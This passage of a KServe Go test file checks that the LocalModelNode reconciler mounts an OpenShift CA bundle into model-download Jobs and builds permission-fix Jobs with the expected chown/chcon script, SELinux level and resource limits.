//go:build distro

/*
Copyright 2024 The KServe Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package localmodelnode

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/kubernetes"
	"k8s.io/utils/ptr"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	"github.com/kserve/kserve/pkg/apis/serving/v1alpha1"
	"github.com/kserve/kserve/pkg/constants"
	"github.com/kserve/kserve/pkg/credentials/s3"
	pkgtypes "github.com/kserve/kserve/pkg/types"
)

func TestMountODHCustomCABundle(t *testing.T) {
	oldConfig := storageInitializerConfig
	t.Cleanup(func() { storageInitializerConfig = oldConfig })

	const namespace = "ca-test-namespace"
	const configuredPath = "/configured/custom-certs"
	tests := []struct {
		name          string
		bundleData    map[string]string
		env           []corev1.EnvVar
		extraVolume   *corev1.Volume
		wantMounted   bool
		wantMountPath string
	}{
		{name: "bundle present", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, wantMounted: true, wantMountPath: configuredPath},
		{name: "bundle absent"},
		{name: "bundle empty", bundleData: map[string]string{constants.DefaultCaBundleFileName: "  \n"}},
		{name: "wrong file key", bundleData: map[string]string{"odh-ca-bundle.crt": "test certificate"}},
		{name: "explicit CA ConfigMap", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: constants.CaBundleConfigMapNameEnvVarKey, Value: "explicit-bundle"}}},
		{name: "explicit AWS CA", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: s3.AWSCABundleConfigMap, Value: "explicit-bundle"}}},
		{name: "explicit SSL certificate file", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: "SSL_CERT_FILE", Value: "/explicit/ca.pem"}}},
		{name: "CA from ValueFrom", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: "SSL_CERT_FILE", ValueFrom: &corev1.EnvVarSource{FieldRef: &corev1.ObjectFieldSelector{FieldPath: "metadata.name"}}}}},
		{name: "empty SSL certificate file", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: "SSL_CERT_FILE"}}, wantMounted: true, wantMountPath: configuredPath},
		{name: "empty CA ConfigMap name", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: constants.CaBundleConfigMapNameEnvVarKey}}, wantMounted: true, wantMountPath: configuredPath},
		{name: "existing mount path", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: constants.CaBundleVolumeMountPathEnvVarKey, Value: "/existing/custom-certs"}}, wantMounted: true, wantMountPath: "/existing/custom-certs"},
		{name: "empty mount path", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, env: []corev1.EnvVar{{Name: constants.CaBundleVolumeMountPathEnvVarKey}}, wantMounted: true, wantMountPath: configuredPath},
		{name: "volume name collision", bundleData: map[string]string{constants.DefaultCaBundleFileName: "test certificate"}, extraVolume: &corev1.Volume{Name: CaBundleVolumeName, VolumeSource: corev1.VolumeSource{EmptyDir: &corev1.EmptyDirVolumeSource{}}}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			storageInitializerConfig = &pkgtypes.StorageInitializerConfig{CaBundleVolumeMountPath: configuredPath}
			scheme := runtime.NewScheme()
			if err := corev1.AddToScheme(scheme); err != nil {
				t.Fatal(err)
			}
			var objects []client.Object
			if tt.bundleData != nil {
				objects = append(objects, &corev1.ConfigMap{
					ObjectMeta: metav1.ObjectMeta{Name: odhCustomCABundleConfigMapName, Namespace: namespace},
					Data:       tt.bundleData,
				})
			}
			reader := fake.NewClientBuilder().WithScheme(scheme).WithObjects(objects...).Build()
			reconciler := &LocalModelNodeReconciler{APIReader: reader, Log: ctrl.Log.WithName("ca-test")}
			job := &batchv1.Job{
				ObjectMeta: metav1.ObjectMeta{Namespace: namespace},
				Spec: batchv1.JobSpec{Template: corev1.PodTemplateSpec{Spec: corev1.PodSpec{
					Containers: []corev1.Container{{
						Name: "download", Env: append([]corev1.EnvVar(nil), tt.env...),
						VolumeMounts: []corev1.VolumeMount{{Name: constants.PvcSourceMountName, MountPath: MountPath}},
					}},
					Volumes: []corev1.Volume{{Name: constants.PvcSourceMountName}},
				}}},
			}
			if tt.extraVolume != nil {
				job.Spec.Template.Spec.Volumes = append(job.Spec.Template.Spec.Volumes, *tt.extraVolume)
			}
			before := job.DeepCopy()
			if err := reconciler.mountODHCustomCABundle(context.Background(), job); err != nil {
				t.Fatal(err)
			}
			if !tt.wantMounted {
				if !reflect.DeepEqual(job, before) {
					t.Fatalf("job changed without a usable implicit CA bundle: %#v", job.Spec.Template.Spec)
				}
				return
			}

			pod := job.Spec.Template.Spec
			if len(pod.Volumes) != len(before.Spec.Template.Spec.Volumes)+1 || len(pod.Containers[0].VolumeMounts) != 2 {
				t.Fatalf("expected one CA volume and mount in addition to PVC: %#v", pod)
			}
			volume := pod.Volumes[len(pod.Volumes)-1]
			if volume.Name != CaBundleVolumeName || volume.ConfigMap == nil || volume.ConfigMap.Name != odhCustomCABundleConfigMapName || volume.ConfigMap.Optional == nil || !*volume.ConfigMap.Optional {
				t.Fatalf("unexpected CA ConfigMap volume: %#v", volume)
			}
			mount := pod.Containers[0].VolumeMounts[1]
			if mount.Name != CaBundleVolumeName || mount.MountPath != tt.wantMountPath || !mount.ReadOnly {
				t.Fatalf("unexpected CA mount: %#v", mount)
			}
			envValues := map[string]string{}
			envCounts := map[string]int{}
			for _, env := range pod.Containers[0].Env {
				envValues[env.Name] = env.Value
				envCounts[env.Name]++
			}
			if envValues[constants.CaBundleConfigMapNameEnvVarKey] != odhCustomCABundleConfigMapName ||
				envValues[constants.CaBundleVolumeMountPathEnvVarKey] != tt.wantMountPath ||
				envCounts[constants.CaBundleConfigMapNameEnvVarKey] != 1 ||
				envCounts[constants.CaBundleVolumeMountPathEnvVarKey] != 1 {
				t.Fatalf("unexpected CA environment: %#v", pod.Containers[0].Env)
			}
			once := job.DeepCopy()
			if err := reconciler.mountODHCustomCABundle(context.Background(), job); err != nil || !reflect.DeepEqual(job, once) {
				t.Fatalf("repeated CA injection changed job or failed: %v", err)
			}
		})
	}
}

type failingCABundleReader struct{ client.Reader }

func (f failingCABundleReader) Get(context.Context, client.ObjectKey, client.Object, ...client.GetOption) error {
	return errors.New("ConfigMap read failed")
}

func TestMountODHCustomCABundleReadError(t *testing.T) {
	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{Namespace: "ca-test-namespace"},
		Spec: batchv1.JobSpec{Template: corev1.PodTemplateSpec{Spec: corev1.PodSpec{
			Containers: []corev1.Container{{Name: "download"}},
		}}},
	}
	reconciler := &LocalModelNodeReconciler{APIReader: failingCABundleReader{}, Log: ctrl.Log.WithName("ca-test")}
	if err := reconciler.mountODHCustomCABundle(context.Background(), job); err == nil {
		t.Fatal("expected ConfigMap read error to stop Job creation and trigger reconcile retry")
	}
}

var _ = Describe("LocalModelNode OCP platform hooks", func() {
	const (
		timeout             = time.Second * 10
		interval            = time.Millisecond * 250
		modelCacheNamespace = "kserve-localmodel-jobs"
		sourceModelUri      = "s3://mybucket/mymodel"
	)
	var (
		modelName = "iris"
		configs   = map[string]string{
			"localModel": fmt.Sprintf(`{
				"jobNamespace": "%s",
				"defaultJobImage": "kserve/storage-initializer:latest",
				"fsGroup": 1000
			}`, modelCacheNamespace),
			"storageInitializer": `{
				"image": "kserve/storage-initializer:latest",
				"cpuRequest": "100m",
				"cpuLimit": "1",
				"memoryRequest": "200Mi",
				"memoryLimit": "1Gi"
			}`,
			"openshiftConfig": `{
				"modelcachePermissionFixImage": "quay.io/opendatahub/kserve-agent:latest"
			}`,
		}
		clusterStorageContainerSpec = v1alpha1.StorageContainerSpec{
			SupportedUriFormats: []v1alpha1.SupportedUriFormat{{Prefix: "s3://"}},
			Container: corev1.Container{
				Name:  "name",
				Image: "image",
				Args: []string{
					"srcURI",
					constants.DefaultModelLocalMountPath,
				},
				TerminationMessagePolicy: corev1.TerminationMessageFallbackToLogsOnError,
				VolumeMounts:             []corev1.VolumeMount{},
			},
		}
		localModelNodeGroupSpec = v1alpha1.LocalModelNodeGroupSpec{
			PersistentVolumeSpec: corev1.PersistentVolumeSpec{
				AccessModes:                   []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
				VolumeMode:                    ptr.To(corev1.PersistentVolumeFilesystem),
				Capacity:                      corev1.ResourceList{corev1.ResourceStorage: resource.MustParse("2Gi")},
				StorageClassName:              "standard",
				PersistentVolumeReclaimPolicy: corev1.PersistentVolumeReclaimDelete,
				PersistentVolumeSource: corev1.PersistentVolumeSource{
					HostPath: &corev1.HostPathVolumeSource{
						Path: "/models",
						Type: ptr.To(corev1.HostPathDirectory),
					},
				},
				NodeAffinity: &corev1.VolumeNodeAffinity{
					Required: &corev1.NodeSelector{
						NodeSelectorTerms: []corev1.NodeSelectorTerm{
							{
								MatchExpressions: []corev1.NodeSelectorRequirement{
									{
										Key:      "node.kubernetes.io/instance-type",
										Operator: corev1.NodeSelectorOpIn,
										Values:   []string{"gpu"},
									},
								},
							},
						},
					},
				},
			},
			PersistentVolumeClaimSpec: corev1.PersistentVolumeClaimSpec{
				AccessModes: []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
				Resources:   corev1.VolumeResourceRequirements{Requests: corev1.ResourceList{corev1.ResourceStorage: resource.MustParse("2Gi")}},
			},
		}
	)

	Context("When using OCP platform hooks", func() {
		It("Should mount the ODH CA bundle on a Hugging Face download job", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)
			oldNodeName, oldWritable := nodeName, isModelRootWritable
			DeferCleanup(func() {
				nodeName = oldNodeName
				isModelRootWritable = oldWritable
			})
			fsMock.clear()
			fsHelper = fsMock
			isModelRootWritable = func() bool { return true }

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{Name: constants.InferenceServiceConfigMapName, Namespace: constants.KServeNamespace},
				Data:       configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).To(Succeed())
			DeferCleanup(func() { Expect(k8sClient.Delete(ctx, configMap)).To(Succeed()) })

			caBundle := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{Name: odhCustomCABundleConfigMapName, Namespace: modelCacheNamespace},
				Data:       map[string]string{constants.DefaultCaBundleFileName: "test certificate"},
			}
			Expect(k8sClient.Create(ctx, caBundle)).To(Succeed())
			DeferCleanup(func() { Expect(k8sClient.Delete(ctx, caBundle)).To(Succeed()) })

			nodeName = "worker-hf-odh-ca"
			const modelName = "hf-odh-ca-model"
			const sourceURI = "hf://org/private-model"
			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{LocalModels: []v1alpha1.LocalModelInfo{{
					SourceModelUri: sourceURI,
					ModelName:      modelName,
					NodeGroup:      "gpu",
				}}},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).To(Succeed())
			DeferCleanup(func() { Expect(k8sClient.Delete(ctx, localModelNode)).To(Succeed()) })

			jobs := &batchv1.JobList{}
			Eventually(func() int {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace),
					client.MatchingLabels{"model": modelName, "node": nodeName})
				if err != nil {
					return 0
				}
				return len(jobs.Items)
			}, timeout, interval).Should(Equal(1))

			job := jobs.Items[0]
			DeferCleanup(func() { Expect(k8sClient.Delete(ctx, &job)).To(Succeed()) })
			Expect(job.Spec.Template.Spec.Containers).To(HaveLen(1))
			container := job.Spec.Template.Spec.Containers[0]
			Expect(container.Args[0]).To(Equal(sourceURI))
			Expect(container.VolumeMounts).To(ContainElement(corev1.VolumeMount{
				Name: constants.PvcSourceMountName, MountPath: MountPath,
			}))
			Expect(job.Spec.Template.Spec.Volumes).To(ContainElement(HaveField("PersistentVolumeClaim.ClaimName", "hf-odh-ca-model-gpu")))
			Expect(container.VolumeMounts).To(ContainElement(corev1.VolumeMount{
				Name: CaBundleVolumeName, MountPath: constants.DefaultCaBundleVolumeMountPath, ReadOnly: true,
			}))
			Expect(container.Env).To(ContainElement(corev1.EnvVar{
				Name: constants.CaBundleConfigMapNameEnvVarKey, Value: odhCustomCABundleConfigMapName,
			}))
			Expect(container.Env).To(ContainElement(corev1.EnvVar{
				Name: constants.CaBundleVolumeMountPathEnvVarKey, Value: constants.DefaultCaBundleVolumeMountPath,
			}))
			Expect(job.Spec.Template.Spec.Volumes).To(ContainElement(And(
				HaveField("Name", CaBundleVolumeName),
				HaveField("ConfigMap.Name", odhCustomCABundleConfigMapName),
				HaveField("ConfigMap.Optional", Equal(ptr.To(true))),
			)))
		})

		It("Should keep default trust for an empty bundle and reject CA lookup errors before creating a Job", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)
			oldNodeName, oldJobNamespace, oldStorageConfig := nodeName, jobNamespace, storageInitializerConfig
			DeferCleanup(func() {
				nodeName, jobNamespace, storageInitializerConfig = oldNodeName, oldJobNamespace, oldStorageConfig
			})
			nodeName = "worker-ca-lookup"
			jobNamespace = modelCacheNamespace
			storageInitializerConfig = &pkgtypes.StorageInitializerConfig{Image: "kserve/storage-initializer:latest"}

			clientset, err := kubernetes.NewForConfig(cfg)
			Expect(err).NotTo(HaveOccurred())
			reconciler := &LocalModelNodeReconciler{
				Client: k8sClient, APIReader: k8sClient, Clientset: clientset,
				Scheme: k8sClient.Scheme(), Log: ctrl.Log.WithName("ca-lookup-test"),
			}
			emptyModel := v1alpha1.LocalModelInfo{
				SourceModelUri: "hf://org/empty-ca-model", ModelName: "empty-ca-model", NodeGroup: "gpu",
			}
			owner := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: "ca-lookup-owner"},
				Spec:       v1alpha1.LocalModelNodeSpec{LocalModels: []v1alpha1.LocalModelInfo{emptyModel}},
			}
			Expect(k8sClient.Create(ctx, owner)).To(Succeed())
			DeferCleanup(func() { Expect(k8sClient.Delete(ctx, owner)).To(Succeed()) })

			emptyBundle := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{Name: odhCustomCABundleConfigMapName, Namespace: modelCacheNamespace},
				Data:       map[string]string{constants.DefaultCaBundleFileName: "  \n"},
			}
			Expect(k8sClient.Create(ctx, emptyBundle)).To(Succeed())
			DeferCleanup(func() { Expect(k8sClient.Delete(ctx, emptyBundle)).To(Succeed()) })

			job, err := reconciler.launchJob(ctx, *owner, emptyModel)
			Expect(err).NotTo(HaveOccurred())
			DeferCleanup(func() { Expect(k8sClient.Delete(ctx, job)).To(Succeed()) })
			Expect(job.Spec.Template.Spec.Volumes).NotTo(ContainElement(HaveField("Name", CaBundleVolumeName)))
			container := job.Spec.Template.Spec.Containers[0]
			Expect(container.VolumeMounts).NotTo(ContainElement(HaveField("Name", CaBundleVolumeName)))
			Expect(container.Env).NotTo(ContainElement(HaveField("Name", constants.CaBundleConfigMapNameEnvVarKey)))
			Expect(container.Env).NotTo(ContainElement(HaveField("Name", constants.CaBundleVolumeMountPathEnvVarKey)))

			reconciler.APIReader = failingCABundleReader{Reader: k8sClient}
			failedModel := v1alpha1.LocalModelInfo{
				SourceModelUri: "hf://org/unreadable-ca-model", ModelName: "unreadable-ca-model", NodeGroup: "gpu",
			}
			failedJob, err := reconciler.launchJob(ctx, *owner, failedModel)
			Expect(failedJob).To(BeNil())
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("ConfigMap read failed"))
			jobs := &batchv1.JobList{}
			Expect(k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace),
				client.MatchingLabels{"model": failedModel.ModelName, "node": owner.Name})).To(Succeed())
			Expect(jobs.Items).To(BeEmpty())
		})

		It("Should create download job with cleared SubPath and explicit Args path", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)
			fsMock.clear()
			storageKey := v1alpha1.GetStorageKey(sourceModelUri)
			fsMock.mockModel(&MockFileInfo{name: storageKey, isDir: true})

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			clusterStorageContainer := &v1alpha1.ClusterStorageContainer{
				ObjectMeta: metav1.ObjectMeta{Name: "test-ocp-subpath"},
				Spec:       clusterStorageContainerSpec,
			}
			Expect(k8sClient.Create(ctx, clusterStorageContainer)).Should(Succeed())
			defer k8sClient.Delete(ctx, clusterStorageContainer)

			nodeGroup := &v1alpha1.LocalModelNodeGroup{
				ObjectMeta: metav1.ObjectMeta{Name: "gpu"},
				Spec:       localModelNodeGroupSpec,
			}
			Expect(k8sClient.Create(ctx, nodeGroup)).Should(Succeed())
			defer k8sClient.Delete(ctx, nodeGroup)

			nodeName = "worker-ocp-subpath"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{
						{
							SourceModelUri: sourceModelUri,
							ModelName:      modelName,
						},
					},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			jobs := &batchv1.JobList{}
			labelSelector := map[string]string{
				"model": modelName,
				"node":  nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(labelSelector))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Download job should be created")

			job := &jobs.Items[0]
			Expect(job.Spec.Template.Spec.Containers).To(HaveLen(1))
			container := job.Spec.Template.Spec.Containers[0]
			Expect(container.VolumeMounts).To(HaveLen(1))
			Expect(container.VolumeMounts[0].SubPath).To(BeEmpty(),
				"Download job should not use SubPath, to allow FSGroup to apply permissions")
			Expect(container.Args).To(Equal([]string{sourceModelUri, filepath.Join(MountPath, "models", storageKey)}),
				"Download destination should include storageKey subdirectory")
			Expect(job.Spec.Template.Spec.ServiceAccountName).To(Equal("kserve-localmodelnode-agent"))
			Expect(job.Spec.Template.Spec.Volumes).NotTo(ContainElement(HaveField("Name", CaBundleVolumeName)))
			Expect(container.Env).NotTo(ContainElement(HaveField("Name", constants.CaBundleConfigMapNameEnvVarKey)))
			Expect(container.Env).NotTo(ContainElement(HaveField("Name", constants.CaBundleVolumeMountPathEnvVarKey)))
		})

		It("Should create permission fix job with single container when filesystem is not writable", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock = &mockFileSystem{
				subDirs: []os.DirEntry{},
			}
			fsHelper = fsMock
			// Simulate a root-owned volume that the agent can't write to, triggering the permission-fix job flow
			isModelRootWritable = func() bool { return false }

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			nodeName = "worker-perm-fix"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			// Wait for permission fix job
			jobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Permission fix job should be created")

			job := &jobs.Items[0]

			// Verify dedicated service account
			Expect(job.Spec.Template.Spec.ServiceAccountName).To(Equal("kserve-localmodel-permfix"))

			// Verify no init containers
			Expect(job.Spec.Template.Spec.InitContainers).To(BeEmpty())

			// Verify single main container with sh -c script
			Expect(job.Spec.Template.Spec.Containers).To(HaveLen(1))
			container := job.Spec.Template.Spec.Containers[0]
			Expect(container.Name).To(Equal("fix-permissions"))
			Expect(container.Command).To(Equal([]string{
				"sh", "-c",
				`set -eu; chown -R "$FIX_UID:$FIX_GID" "$TARGET" && chcon -R -t container_file_t -l s0 "$TARGET"`,
			}), "Relabel must target the shared category-less MCS level (s0), not a namespace MCS")

			// Verify env vars — MCS_LEVEL is no longer passed; the shared level is a constant in the script
			envMap := map[string]string{}
			for _, e := range container.Env {
				envMap[e.Name] = e.Value
			}
			Expect(envMap).To(HaveKeyWithValue("FIX_UID", "1000"))
			Expect(envMap).To(HaveKeyWithValue("FIX_GID", "1000"))
			Expect(envMap).To(HaveKeyWithValue("TARGET", MountPath))
			Expect(envMap).NotTo(HaveKey("MCS_LEVEL"),
				"MCS_LEVEL env must not be set — the relabel level is the shared s0 constant")

			// Verify the permfix pod itself runs at the shared level
			Expect(job.Spec.Template.Spec.SecurityContext.SELinuxOptions).NotTo(BeNil())
			Expect(job.Spec.Template.Spec.SecurityContext.SELinuxOptions.Level).To(Equal("s0"))
			Expect(job.Spec.Template.Spec.SecurityContext.SELinuxOptions.Type).To(Equal("spc_t"))

			// Verify resource limits
			Expect(container.Resources.Requests).NotTo(BeEmpty())
			Expect(container.Resources.Limits).NotTo(BeEmpty())

			// Verify blast radius controls
			Expect(job.Spec.ActiveDeadlineSeconds).To(Equal(ptr.To(int64(120))),
				"Job should have ActiveDeadlineSeconds to limit privileged pod lifetime")

			// Verify seccomp profile
			Expect(job.Spec.Template.Spec.SecurityContext.SeccompProfile).NotTo(BeNil(),
				"Pod should have a seccomp profile")
			Expect(job.Spec.Template.Spec.SecurityContext.SeccompProfile.Type).To(
				Equal(corev1.SeccompProfileTypeRuntimeDefault))

			// Reset writable for cleanup
			isModelRootWritable = func() bool { return true }
		})

		It("Should skip permission fix when filesystem is writable", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)
			fsMock.clear()
			// Simulate a volume that's already writable, so the reconciler skips the permission-fix job
			isModelRootWritable = func() bool { return true }
			fsHelper = fsMock
			storageKey := v1alpha1.GetStorageKey(sourceModelUri)
			fsMock.mockModel(&MockFileInfo{name: storageKey, isDir: true})

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			clusterStorageContainer := &v1alpha1.ClusterStorageContainer{
				ObjectMeta: metav1.ObjectMeta{Name: "test-ocp-writable"},
				Spec:       clusterStorageContainerSpec,
			}
			Expect(k8sClient.Create(ctx, clusterStorageContainer)).Should(Succeed())
			defer k8sClient.Delete(ctx, clusterStorageContainer)

			nodeGroup := &v1alpha1.LocalModelNodeGroup{
				ObjectMeta: metav1.ObjectMeta{Name: "gpu"},
				Spec:       localModelNodeGroupSpec,
			}
			Expect(k8sClient.Create(ctx, nodeGroup)).Should(Succeed())
			defer k8sClient.Delete(ctx, nodeGroup)

			nodeName = "worker-ocp-writable"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{
						{
							SourceModelUri: sourceModelUri,
							ModelName:      modelName,
						},
					},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			// Wait for download job (proves reconcile ran)
			jobs := &batchv1.JobList{}
			labelSelector := map[string]string{
				"model": modelName,
				"node":  nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(labelSelector))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Download job should be created")

			// Assert no permission fix jobs exist
			fixJobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			err := k8sClient.List(ctx, fixJobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
			Expect(err).ShouldNot(HaveOccurred())
			Expect(fixJobs.Items).To(BeEmpty(), "No permission fix jobs should exist when filesystem is writable")
		})

		It("Should launch permission fix job when subdirectories have permission issues", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock = &mockFileSystem{
				subDirs: []os.DirEntry{},
			}
			fsHelper = fsMock
			isModelRootWritable = func() bool { return true }

			// Point modelsRootFolder to a real temp dir with a broken subdirectory
			tmpDir, err := os.MkdirTemp("", "modelcache-subdir-perm-*")
			Expect(err).NotTo(HaveOccurred())
			defer os.RemoveAll(tmpDir)
			brokenSubdir := filepath.Join(tmpDir, "model-broken")
			Expect(os.Mkdir(brokenSubdir, 0o000)).To(Succeed())
			defer os.Chmod(brokenSubdir, 0o755) //nolint
			savedModelsRoot := modelsRootFolder
			modelsRootFolder = tmpDir
			defer func() { modelsRootFolder = savedModelsRoot }()

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			nodeName = "worker-subdir-perm"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			jobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(),
				"Permission fix job should be created when subdirectories have permission issues despite root being writable")

			isModelRootWritable = func() bool { return true }
		})

		It("Should fall back to process UID when FSGroup is not configured", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock = &mockFileSystem{
				subDirs: []os.DirEntry{},
			}
			fsHelper = fsMock
			isModelRootWritable = func() bool { return false }

			// Save and clear FSGroup
			savedFSGroup := FSGroup
			FSGroup = nil
			defer func() { FSGroup = savedFSGroup }()

			configsNoFSGroup := map[string]string{
				"localModel": fmt.Sprintf(`{
					"jobNamespace": "%s",
					"defaultJobImage": "kserve/storage-initializer:latest"
